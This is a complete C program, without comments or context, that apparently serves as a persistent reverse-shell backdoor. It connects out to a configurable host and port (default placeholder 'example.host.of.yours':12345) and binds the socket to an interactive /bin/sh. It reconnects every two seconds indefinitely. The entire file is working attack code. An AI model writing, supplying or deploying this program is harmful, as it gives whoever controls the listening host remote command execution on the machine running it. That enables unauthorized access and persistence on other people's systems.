#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#define DEFAULT_HOST    "example.host.of.yours"
#define DEFAULT_PORT    12345
#define RETRY_DELAY_SEC 2
#define MAX_RETRIES     0

static int connect_to(const char *host, unsigned short port)
{
    struct sockaddr_in addr;
    struct hostent    *he;
    int sock;

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) return -1;

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port   = htons(port);

    if (inet_aton(host, &addr.sin_addr) == 0) {
        he = gethostbyname(host);
        if (!he) { close(sock); return -1; }
        memcpy(&addr.sin_addr, he->h_addr_list[0], (size_t)he->h_length);
    }

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sock);
        return -1;
    }

    return sock;
}

static void spawn_shell(int sock)
{
    char *const argv[] = { "/bin/sh", "-i", NULL };
    char *const envp[] = { NULL };

    dup2(sock, STDIN_FILENO);
    dup2(sock, STDOUT_FILENO);
    dup2(sock, STDERR_FILENO);

    if (sock > STDERR_FILENO)
        close(sock);

    execve("/bin/sh", argv, envp);
    _exit(EXIT_FAILURE);
}

int main(int argc, char *argv[])
{
    const char    *host  = DEFAULT_HOST;
    unsigned short port  = DEFAULT_PORT;
    unsigned int   tries = 0;
    int            sock;
    pid_t          pid;

    if (argc >= 2) host = argv[1];
    if (argc >= 3) port = (unsigned short)atoi(argv[2]);

    while (1) {
        tries++;
        sock = connect_to(host, port);

        if (sock >= 0) {
            pid = fork();
            if (pid < 0) {
                close(sock);
            } else if (pid == 0) {
                spawn_shell(sock);
            } else {
                close(sock);
                waitpid(pid, NULL, 0);
            }
        }

        if (MAX_RETRIES && tries >= MAX_RETRIES) break;
        sleep(RETRY_DELAY_SEC);
    }

    return 0;
}
